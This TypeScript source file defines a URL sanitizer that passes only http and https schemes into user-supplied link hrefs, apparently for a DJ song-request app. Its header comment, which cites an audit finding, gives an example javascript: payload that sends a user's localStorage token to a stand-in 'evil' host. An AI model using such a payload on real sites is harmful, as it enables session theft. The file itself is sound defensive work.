/**
 * URL sanitization for user-supplied href attributes.
 *
 * SECURITY (H-F1): React does NOT strip `javascript:` from href attributes
 * in production (only warns in dev). A guest who submits a song request with
 * `source_url = "javascript:fetch('//evil/?'+localStorage.token)"` can steal
 * the DJ's JWT when they click the open-link icon.
 *
 * This helper ensures only safe schemes (http, https) pass through.
 * All other schemes (javascript:, data:, vbscript:, etc.) are rejected.
 *
 * @see docs/security/audit-2026-04-08.md H-F1
 */

const SAFE_SCHEMES = new Set(['http:', 'https:'])

/**
 * Returns the URL unchanged if it uses a safe scheme (http/https),
 * or `undefined` if the URL is invalid or uses a dangerous scheme.
 *
 * Use in anchor `href` attributes:
 * ```tsx
 * <a href={safeExternalUrl(userUrl) ?? '#'}>Link</a>
 * ```
 */
export function safeExternalUrl(url: string | null | undefined): string | undefined {
  if (!url) return undefined

  try {
    const parsed = new URL(url)
    if (SAFE_SCHEMES.has(parsed.protocol)) {
      return url
    }
    return undefined
  } catch {
    // URL() throws on invalid URLs — reject them
    return undefined
  }
}
